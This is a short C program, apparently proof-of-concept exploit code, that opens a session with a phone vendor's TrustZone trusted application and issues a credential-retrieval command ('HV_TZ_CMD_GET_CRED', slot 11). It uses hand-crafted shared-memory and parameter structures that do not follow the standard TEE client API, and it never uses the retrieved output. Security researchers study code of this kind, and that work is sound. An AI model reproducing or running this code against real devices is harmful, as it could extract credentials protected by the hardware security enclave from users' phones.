#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#include <teecl.h>

#define HV_TZ_CMD_GET_CRED 0x271f
#define HV_TZ_CRED_SLOT 11
#define SSP_DEVICE "/dev/ssp"
#define SSP_IOCTL_MAGIC 'c'
#define SSP_IOCTL_INIT _IO(SSP_IOCTL_MAGIC, 1)
#define SSP_IOCTL_EXIT _IOWR(SSP_IOCTL_MAGIC, 2, uint64_t)
#define TA_PATH "/vendor/tee/00000000-0000-0000-0000-487641557457"
#define TA_UUID "\0\0\0\0\0\0\0\0\0\0HvAUtW"

struct payload {
    uint32_t started;
    uint32_t paramTypes;
    uint32_t** in;
    uint64_t reserved[2];
    uint32_t** out;
};

struct shared_mem {
    uint32_t* buffer;
    size_t size;
    uint32_t flags;
    uint64_t reserved;
};

void *context, *session;
uint32_t in_mem[] = {HV_TZ_CMD_GET_CRED, 8, 0x1000005, HV_TZ_CRED_SLOT};
struct shared_mem in = {.buffer = in_mem, .size = 16, .flags = TEEC_VALUE_INPUT};
struct shared_mem out = {.size = 124, .flags = TEEC_VALUE_OUTPUT};
struct payload pl = {.paramTypes = 0xcc, .in = &in.buffer, .out = &out.buffer};

void nwd_tz_open() {
    int fd;
    size_t size;
    struct stat st;
    void* data;

    TEEC_InitializeContext(NULL, &context);

    fd = open(TA_PATH, O_RDONLY);
    fstat(fd, &st);
    size = st.st_size;
    data = malloc(size);
    read(fd, data, size);
    close(fd);

    TEECS_OpenSession(&context, &session, TA_UUID, data, size, 0, NULL, NULL, NULL);
    free(data);
}

void nwd_tz_close() {
    TEEC_CloseSession(&session);
    TEEC_FinalizeContext(&context);
}

void hwvault_ssp_init() {
    int fd = open(SSP_DEVICE, O_RDONLY);
    ioctl(fd, SSP_IOCTL_INIT);
    close(fd);
}

void hwvault_ssp_exit() {
    int fd = open(SSP_DEVICE, O_RDONLY);
    ioctl(fd, SSP_IOCTL_EXIT);
    close(fd);
}

void hwvault_get_cred() {
    out.buffer = malloc(out.size);
    TEEC_RegisterSharedMemory(&context, &out);
    TEEC_RegisterSharedMemory(&context, &in);

    hwvault_ssp_init();
    TEEC_InvokeCommand(&session, 0, &pl, NULL);
    hwvault_ssp_exit();

    TEEC_ReleaseSharedMemory(&in);
    TEEC_ReleaseSharedMemory(&out);
    free(out.buffer);
}

int main() {
    nwd_tz_open();
    hwvault_get_cred();
    pause();
    nwd_tz_close();
    return -1;
}
